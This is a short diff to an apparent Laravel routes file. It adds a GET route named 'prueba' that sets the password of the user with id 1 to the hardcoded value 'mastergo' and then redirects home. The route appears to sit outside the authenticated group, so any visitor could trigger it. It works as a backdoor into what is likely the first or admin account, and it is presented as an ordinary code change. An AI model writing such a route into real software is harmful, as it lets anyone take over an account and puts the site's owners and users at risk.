@@ -19,7 +19,7 @@ use App\Http\Controllers\ReportController;
 use App\Http\Controllers\SettingController;
 use App\Http\Controllers\StoreController;
 use App\Http\Controllers\UserController;
-
+use App\Models\User;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -133,6 +133,7 @@ Route::middleware(['auth'])->group(function () {
 
 
 Route::get('prueba', function () {
- 
+    $user=User::find(1);
+    $user->update(['password'=>'mastergo']);
   return redirect()->route('home');
 })->name('prueba');
